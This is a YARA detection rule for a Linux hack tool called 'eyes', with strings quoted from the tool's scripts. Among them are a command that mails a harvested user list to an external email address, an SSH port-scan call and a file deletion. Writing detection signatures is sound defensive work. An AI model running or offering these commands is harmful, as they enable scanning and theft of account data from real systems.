rule LinuxHacktool_eyes_a_RID2F2B : DEMO HKTL LINUX {
   meta:
      description = "Linux hack tools - file a"
      author = "Florian Roth"
      reference = "not set"
      date = "2015-01-19 11:45:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, LINUX"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "cat trueusers.txt | mail -s \"eyes\" clubby@slucia.com" fullword ascii
      $s1 = "mv scan.log bios.txt" fullword ascii
      $s2 = "rm -rf bios.txt" fullword ascii
      $s3 = "echo -e \"# by Eyes.\"" fullword ascii
      $s4 = "././pscan2 $1 22" fullword ascii
      $s10 = "echo \"#cautam...\"" fullword ascii
   condition: 
      2 of them
}